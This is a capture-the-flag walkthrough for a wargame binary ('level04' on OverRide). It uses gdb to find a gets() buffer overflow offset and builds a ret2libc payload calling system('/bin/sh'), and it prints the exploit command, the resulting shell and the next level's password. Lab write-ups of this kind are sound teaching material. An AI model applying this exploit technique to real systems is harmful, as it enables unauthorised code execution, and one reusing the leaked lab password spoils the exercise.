@@ -1,0 +1,76 @@
+HOW TO FIND THE FLAG:
+
+After analysing the binary and reverse engineered it, we can see the binary uses the gets function so we will try to exploit it with a buffer overflow.
+
+The binary uses the fork() function so we are going to change the follow-fork mode in order to follow the child processes.
+
+(gdb) set follow-fork-mode child
+
+Let's try to overflow it by passing a string composed of unique pattern in order to fin the offset. We use the wiremask buffer oveflow generator as usual 
+
+(gdb) r <<< `python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"'`
+Starting program: /home/users/level04/level04 <<< `python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"'`
+[New process 3771]
+Give me some shellcode, k
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 3771]
+0x41326641 in ?? ()
+
+-> Offset is 156
+
+We are going to use a ret2libc attack -> the goal is to execute the function system with the argument "/bin/sh"
+
+Let's find the adress of system
+
+(gdb) info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
+
+-> "\xd0\xae\xe6\xf7"
+
+Find the adress of "/bin/sh"
+
+(gdb) info proc map
+process 3771
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
+	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
+	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
+	0xf7e2b000 0xf7e2c000     0x1000        0x0 
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0 
+	0xf7fd8000 0xf7fda000     0x2000        0x0 
+	0xf7fda000 0xf7fdb000     0x1000        0x0 
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+
+
+-> "\xec\x97\xf8\xf7"
+
+We can construct our payload like this 
+
+level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "A" * 4 + "\xec\x97\xf8\xf7"'; cat) | ./level04
+Give me some shellcode, k
+whoami
+level05
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
+
+Success
